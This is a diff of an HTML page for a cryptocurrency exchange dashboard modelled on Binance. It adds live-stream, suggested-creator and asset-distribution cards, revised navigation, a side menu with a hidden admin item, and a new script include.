+                  <span><i class="far fa-comment"></i> 1</span>
+                  <span><i class="far fa-heart"></i> 7</span>
+                  <span><i class="fas fa-retweet"></i> 0</span>
+                  <span><i class="fas fa-share"></i> 0</span>
+                </div>
+              </div>
+              <button style="background: none; border: none; color: var(--text-secondary);">
+                <i class="fas fa-times"></i>
+              </button>
+            </div>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- About Web3 Section -->
-    <div class="about-web3">
-      <div class="section-header">
-        <h2 class="section-title">About Web3</h2>
-      </div>
-      
-      <div class="web3-articles">
-        <!-- Article 1 -->
-        <div class="web3-article">
-          <div class="article-image">
-            <img src="img/key.png" alt="Wallet Article" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\' viewBox=\'0 0 24 24\' fill=\'%23F0B90B\' stroke=\'%23000000\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'8\'/><line x1=\'12\' y1=\'4\' x2=\'12\' y2=\'20\' stroke=\'%23000000\' stroke-width=\'2\'/><line x1=\'4\' y1=\'12\' x2=\'20\' y2=\'12\' stroke=\'%23000000\' stroke-width=\'2\'/></svg>'">
-          </div>
-          <h3 class="article-title">What Is Binance Wallet and How Does It Work?</h3>
+    <!-- Live Streams Section -->
+    <div style="padding: 0 16px 16px;">
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <i class="fas fa-video" style="color: #ff0000;"></i> Live Now
+          </h3>
         </div>
-        
-        <!-- Article 2 -->
-        <div class="web3-article">
-          <div class="article-image">
-            <img src="img/crypto-article.png" alt="Crypto Article" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\' viewBox=\'0 0 24 24\' fill=\'%23F0B90B\' stroke=\'%23000000\' stroke-width=\'1\'><rect x=\'2\' y=\'4\' width=\'20\' height=\'16\' rx=\'2\' ry=\'2\'/><line x1=\'12\' y1=\'4\' x2=\'12\' y2=\'20\' stroke=\'%23000000\' stroke-width=\'2\'/></svg>'">
+        <div class="card-body">
+          <div style="position: relative; border-radius: 12px; overflow: hidden; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 180px;">
+            <div style="position: absolute; top: 12px; left: 12px; background: rgba(138, 43, 226, 0.9); color: white; padding: 4px 12px; border-radius: 4px; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 4px;">
+              <i class="fas fa-circle" style="font-size: 8px; animation: pulse 2s infinite;"></i> LIVE
+            </div>
+            <div style="position: absolute; top: 12px; right: 12px; background: rgba(0, 0, 0, 0.6); color: white; padding: 4px 12px; border-radius: 4px; font-size: 12px; font-weight: 600;">
+              <i class="fas fa-user"></i> 1283
+            </div>
+            <div style="position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); padding: 16px;">
+              <div style="color: white; font-weight: 600; margin-bottom: 4px;">HASSII-K</div>
+              <div style="color: rgba(255,255,255,0.8); font-size: 12px;">Bitcoin was the first... but what came second? 🤔</div>
+            </div>
           </div>
-          <h3 class="article-title">What Is Binance and How to Get Started?</h3>
+        </div>
+      </div>
+    </div>
+
+    <!-- Suggested Creators -->
+    <div style="padding: 0 16px 16px;">
+      <div class="card">
+        <div class="card-header" style="display: flex; justify-content: space-between; align-items: center;">
+          <h3 class="card-title">Suggested Creators</h3>
+          <button style="background: none; border: none; color: var(--text-secondary);">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+        <div class="card-body">
+          <div style="display: flex; flex-direction: column; gap: 16px;">
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <div style="width: 48px; height: 48px; border-radius: 50%; background: var(--bg-tertiary); overflow: hidden;">
+                <img src="img/post1.png" alt="Avatar" style="width: 150%; height: 100%;">
+              </div>
+              <div style="flex: 1;">
+                <div style="font-weight: 600; margin-bottom: 2px;">Binance Risk Sniper</div>
+                <div style="font-size: 12px; color: var(--text-secondary);">Stay ahead on risk warnings, risk sniping, and...</div>
+              </div>
+              <button style="background: var(--primary-color); color: #000; border: none; padding: 6px 20px; border-radius: 6px; font-weight: 600; font-size: 14px;">Follow</button>
+            </div>
+
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <div style="width: 48px; height: 48px; border-radius: 50%; background: var(--bg-tertiary); overflow: hidden;">
+                <img src="img/post2.png" alt="Avatar" style="width: 150%; height: 100%;">
+              </div>
+              <div style="flex: 1;">
+                <div style="font-weight: 600; margin-bottom: 2px;">Binance Angels 👼</div>
+                <div style="font-size: 12px; color: var(--text-secondary);">Official Account of @Binance Angel Program....</div>
+              </div>
+              <button style="background: var(--primary-color); color: #000; border: none; padding: 6px 20px; border-radius: 6px; font-weight: 600; font-size: 14px;">Follow</button>
+            </div>
+
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <div style="width: 48px; height: 48px; border-radius: 50%; background: var(--bg-tertiary); overflow: hidden;">
+                <img src="img/post1.png" alt="Avatar" style="width: 150%; height: 100%;">
+              </div>
+              <div style="flex: 1;">
+                <div style="font-weight: 600; margin-bottom: 2px;">Richard Teng</div>
+                <div style="font-size: 12px; color: var(--text-secondary);">Binance CEO | Formerly Binance Head of Regi...</div>
+              </div>
+              <button style="background: var(--primary-color); color: #000; border: none; padding: 6px 20px; border-radius: 6px; font-weight: 600; font-size: 14px;">Follow</button>
+            </div>
+          </div>
+          
+          <button style="width: 100%; padding: 12px; background: none; border: none; color: var(--primary-color); font-weight: 600; margin-top: 16px;">
+            View More
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- My Assets Distribution -->
+    <div style="padding: 0 16px 100px;">
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">My Assets Distribution</h3>
+        </div>
+        <div class="card-body">
+          <div style="display: flex; flex-direction: column; gap: 12px;">
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <img src="img/usdt.png" alt="USDT" style="width: 32px; height: 32px; border-radius: 50%;" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 24 24\' fill=\'%2326A17B\'><circle cx=\'12\' cy=\'12\' r=\'10\'/></svg>'">
+              <div style="flex: 1;">
+                <div style="font-weight: 600;">USDT</div>
+              </div>
+              <div style="font-weight: 600;">35.20%</div>
+            </div>
+
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <img src="img/bnb.png" alt="BNB" style="width: 32px; height: 32px; border-radius: 50%;" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 24 24\' fill=\'%23F3BA2F\'><circle cx=\'12\' cy=\'12\' r=\'10\'/></svg>'">
+              <div style="flex: 1;">
+                <div style="font-weight: 600;">BNB</div>
+              </div>
+              <div style="font-weight: 600;">25.15%</div>
+            </div>
+
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <img src="img/eth.png" alt="ETH" style="width: 32px; height: 32px; border-radius: 50%;" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 24 24\' fill=\'%23627EEA\'><circle cx=\'12\' cy=\'12\' r=\'10\'/></svg>'">
+              <div style="flex: 1;">
+                <div style="font-weight: 600;">ETH</div>
+              </div>
+              <div style="font-weight: 600;">20.30%</div>
+            </div>
+
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <img src="img/sol.png" alt="SOL" style="width: 32px; height: 32px; border-radius: 50%;" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 24 24\' fill=\'%239945FF\'><circle cx=\'12\' cy=\'12\' r=\'10\'/></svg>'">
+              <div style="flex: 1;">
+                <div style="font-weight: 600;">SOL</div>
+              </div>
+              <div style="font-weight: 600;">12.85%</div>
+            </div>
+
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <img src="img/usdc.png" alt="USDC" style="width: 32px; height: 32px; border-radius: 50%;" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 24 24\' fill=\'%232775CA\'><circle cx=\'12\' cy=\'12\' r=\'10\'/></svg>'">
+              <div style="flex: 1;">
+                <div style="font-weight: 600;">USDC</div>
+              </div>
+              <div style="font-weight: 600;">6.50%</div>
+            </div>
+          </div>
         </div>
       </div>
     </div>
@@ -374,26 +534,87 @@
         <i class="fas fa-home"></i>
         <span>Home</span>
       </a>
-      <a href="#" class="nav-item">
+      <a href="markets.html" class="nav-item">
         <i class="fas fa-chart-line"></i>
         <span>Markets</span>
       </a>
-      <a href="send.html" class="nav-item">
+      <a href="spot-trading.html" class="nav-item">
         <i class="fas fa-exchange-alt"></i>
         <span>Trade</span>
       </a>
-      <a href="profile.html" class="nav-item">
-        <i class="fas fa-user"></i>
-        <span>Profile</span>
+      <a href="#" class="nav-item">
+        <i class="fas fa-th"></i>
+        <span>Square</span>
       </a>
       <a href="defi-wallet.html" class="nav-item">
         <i class="fas fa-wallet"></i>
-        <span>Assets</span>
+        <span>Wallets</span>
       </a>
     </nav>
+
+    <!-- Yellow floating action button -->
+    <button style="position: fixed; bottom: 80px; right: 20px; width: 56px; height: 56px; border-radius: 50%; background: var(--primary-color); border: none; box-shadow: 0 4px 12px rgba(252, 213, 53, 0.4); display: flex; align-items: center; justify-content: center; font-size: 24px; color: #000; z-index: 100;">
+      <i class="fas fa-plus"></i>
+    </button>
   </div>
 
-  <script src="js/dashboard.js"></script>
+  <!-- Hamburger Menu -->
+  <div class="hamburger-menu" id="hamburgerMenu">
+    <div class="menu-header">
+      <div class="menu-user">
+        <div class="menu-avatar" id="menuAvatar">U</div>
+        <div class="menu-user-info">
+          <div class="menu-user-name" id="menuUserName">User</div>
+          <div class="menu-user-email" id="menuUserEmail">user@example.com</div>
+        </div>
+      </div>
+      <button class="btn-icon btn-ghost" id="closeMenuBtn">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    
+    <div class="menu-items">
+      <div class="menu-item" onclick="window.location.href='dashboard.html'">
+        <i class="fas fa-home"></i>
+        <span>Home</span>
+      </div>
+      <div class="menu-item" onclick="window.location.href='defi-wallet.html'">
+        <i class="fas fa-wallet"></i>
+        <span>Wallet</span>
+      </div>
+      <div class="menu-item" onclick="window.location.href='transactions.html'">
+        <i class="fas fa-history"></i>
+        <span>Transaction History</span>
+      </div>
+      <div class="menu-item" onclick="window.location.href='security.html'">
+        <i class="fas fa-shield-alt"></i>
+        <span>Security</span>
+      </div>
+      
+      <div class="menu-divider"></div>
+      
+      <!-- Admin menu item - only shown for admins -->
+      <div class="menu-item admin hidden" id="adminMenuItem" onclick="window.location.href='admin.html'">
+        <i class="fas fa-user-shield"></i>
+        <span>Admin Panel</span>
+      </div>
+      
+      <div class="menu-divider"></div>
+      
+      <div class="menu-item" onclick="window.location.href='profile.html'">
+        <i class="fas fa-user-cog"></i>
+        <span>Settings</span>
+      </div>
+      <div class="menu-item" id="logoutMenuItem">
+        <i class="fas fa-sign-out-alt"></i>
+        <span>Logout</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Overlay -->
+  <div class="overlay" id="overlay"></div>
+
+  <script src="js/dashboard-enhanced.js"></script>
 </body>
 </html>
-
